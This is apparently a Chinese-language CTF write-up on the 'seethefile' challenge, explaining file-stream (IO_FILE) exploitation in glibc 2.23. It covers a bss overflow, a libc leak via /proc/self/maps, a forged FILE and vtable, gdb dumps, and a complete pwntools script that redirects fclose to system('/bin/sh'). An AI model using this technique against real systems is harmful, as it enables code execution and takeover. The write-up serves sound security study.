---
title: CTF | IO_FILE 相关利用
date: 2018-08-14 15:52:08
tags:
---
IO FILE 利用
<!-- more -->

## seethefile
### 分析程序
首先看程序
- `openfile`:读取 长度为63 `filename`,打开文件,这里有溢出，因为 `filename` 大小为 `40`,但是不能覆盖到fp
- `writefile`:输出文件 `magicbuf`，通过这个应该能泄露地址，首先要把内容写道magicbuf 
- `readfile`:从文件中读取内容到 `0x18` 长度
- `closefile`: 这里会调用 `fclose` 函数，可以用来触发
- `exit` : 这里 name 有溢出。可以覆盖到fp,使之指向我们伪造的fp,在调用`fcolse`时调用`system("bin/sh")`

bss data laylout
```python
.bss:0804B080 filename        db 40h dup(?)           ; DATA XREF: openfile+53↑o
.bss:0804B080                                         ; openfile+6D↑o ...
.bss:0804B0C0                 public magicbuf
.bss:0804B0C0 ; char magicbuf[416]
.bss:0804B0C0 magicbuf        db 1A0h dup(?)          ; DATA XREF: openfile+33↑o
.bss:0804B0C0                                         ; readfile+17↑o ...
.bss:0804B260                 public name
.bss:0804B260 ; char name[32]
.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o
.bss:0804B260                                         ; main+B4↑o
.bss:0804B280                 public fp
.bss:0804B280 ; FILE *fp
.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r
.bss:0804B280                                         ; openfile+AD↑w ...
.bss:0804B280 _bss            ends
```

### 漏洞利用
#### 泄露地址
在linux系统中，文件`/proc/[pid]/maps`中记录了pid对应程序的内存区域以及权限信息等，程序自身可以通过访问/proc/self/maps文件获取这些信息，因此我们可以利用本题文件读取的功能，获取maps文件中记录的地址信息，从而获得libc的地址。
#### 构造 FILE
`fp` 指向伪造 `IO_file`,伪造的 `IO_file` 存在，还要指向伪造的 `vtable，`  将`vtable->__fclose`覆盖为 system 地址
因为`vtable`中的函数调用时会把对应的`_IO_FILE_plus`指针作为第一个参数传递，因此这里我们把`"sh"`写入`_IO_FILE_plus`头部。
利用`name`覆盖，结构
`| junk | fp | IO_FILE | IO_file_jumps ptr | IO_file_jumps |`

但是构造的时候需要注意：
1. `IO_FILE` 结构偏移`0x34`处即`_chain`字段指向的也是一个`FILE`结构，我们可以用我们伪造的`IO_FILE_plus`地址填充这个字段,发现不伪造也行。
2. 偏移`0x48`处的`lock`字段指向的是一个`IO_stdfile_2_lock`结构，本地调试时这个结构中的数据均为`\x00`；因此，我们可以用`\x00`填充`name`，然后用`name`的地址覆盖`lock`字段。





我们在 gdb 中 通过 `directory ~/glibc-2.23/libio` 就可以看到 libc 中的代码了

修改前：
```python
gef➤  p *((struct _IO_FILE_plus*)0x804B260)             
$2 = {
  file = {
    _flags = 0x0, 
    _IO_read_ptr = 0x0, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x0, 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x9861010 "\210$\255\373\216\024\206\tp\025\206\tp\021\206\tp\021\206\tp\021\206\tp\021\206\tp\021\206\tp\025\206\t", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0x0, 
    _flags2 = 0x0, 
    _old_offset = 0x0, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0x0, 
    _offset = 0x0, 
    _codecvt = 0x0, 
    _wide_data = 0x0, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x0, 
    _unused2 = '\000' <repeats 39 times>
  }, 
  vtable = 0x0
}
```
修改后
```python
gef➤   p *((struct _IO_FILE_plus*)0x804B260)  
$8 = {
  file = {
    _flags = 0x6e69622f, 
    _IO_read_ptr = 0x68732f <error: Cannot access memory at address 0x68732f>, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x0, 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x804b260 <name> "/bin/sh", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0x0, 
    _flags2 = 0x0, 
    _old_offset = 0x0, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0x804b270 <name+16>, 
    _offset = 0x0, 
    _codecvt = 0x0, 
    _wide_data = 0x0, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x0, 
    _unused2 = '\000' <repeats 39 times>
  }, 
  vtable = 0x804b2b4
}
```
vtable：
```python
gef➤   p *((struct _IO_jump_t*)0x804b2b4)  
$9 = {
  __dummy = 0x0, 
  __dummy2 = 0x0, 
  __finish = 0x0, 
  __overflow = 0x0, 
  __underflow = 0x0, 
  __uflow = 0x0, 
  __pbackfail = 0x0, 
  __xsputn = 0x0, 
  __xsgetn = 0x0, 
  __seekoff = 0x0, 
  __seekpos = 0x0, 
  __setbuf = 0x0, 
  __sync = 0x0, 
  __doallocate = 0x0, 
  __read = 0x0, 
  __write = 0x0, 
  __seek = 0x804b2b4, 
  __close = 0xf7e24da0 <__libc_system>, 
  __stat = 0x0, 
  __showmanyc = 0x0, 
  __imbue = 0x0
}
gef➤  

```
payload
```python
from pwn import *

binary = './seethefile'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def menu(idx):
    io.recvuntil(':')
    io.sendline(str(idx))

def leave_name(nm):
    menu(5)
    io.recvuntil(":")
    io.sendline(nm)

def read_file(nm):
    menu(1)
    io.recvuntil(":")
    io.sendline(nm)
    menu(2)
    menu(2)
    menu(3)

# leak libc address 
read_file('/proc/self/maps')
libc_addr = io.recvuntil("r-xp")
libc.address = int(libc_addr.split('-')[-3].split('\n')[1], 16)
log.info("\033[33m" + hex(libc.address) + "\033[0m")


buffer = 0x804b260 # name's address 
pay = '/bin/sh'.ljust(0x20, '\0')
pay += p32(buffer)
pay = pay.ljust(0x48, '\0')
pay += p32(buffer + 0x10) # make lock point to '\x00'
pay = pay.ljust(0x94, '\0')
pay += p32(0x804b2f8 - 0x44) # vtable address,0x44 is fclose's offset 
pay += p32(libc.symbols['system']) # 0x804b260+0x94 + 4 =0x804b2f8 
#gdb.attach(io)
leave_name(pay)
io.interactive()
```

vtable 结构
```python
const struct _IO_jump_t _IO_file_jumps =  
{  
  JUMP_INIT_DUMMY,  
  JUMP_INIT(finish, INTUSE(_IO_file_finish)),  
  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),  
  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),  
  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),  
  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),  
  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),
  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),  
  JUMP_INIT(seekoff, _IO_new_file_seekoff),  
  JUMP_INIT(seekpos, _IO_default_seekpos),  
  JUMP_INIT(setbuf, _IO_new_file_setbuf), 
  JUMP_INIT(sync, _IO_new_file_sync),  
  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),  
  JUMP_INIT(read, INTUSE(_IO_file_read)),  
  JUMP_INIT(write, _IO_new_file_write),  
  JUMP_INIT(seek, INTUSE(_IO_file_seek)),  
  JUMP_INIT(close, INTUSE(_IO_file_close)),  
  JUMP_INIT(stat, INTUSE(_IO_file_stat)),  
  JUMP_INIT(showmanyc, _IO_default_showmanyc),  
  JUMP_INIT(imbue, _IO_default_imbue)  
};  
```


`IO FILE` 结构
```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
`__flags` 记录 `FILE` 结构体的一些状态；
`_markers` 为指向 `markers` 结构体的指针变量，存放流的位置的单向链表；
`_chain` 变量为一个单向链表的指针，记录进程中创建的 `FILE` 结构体。




### 推荐链接
https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ 
https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/
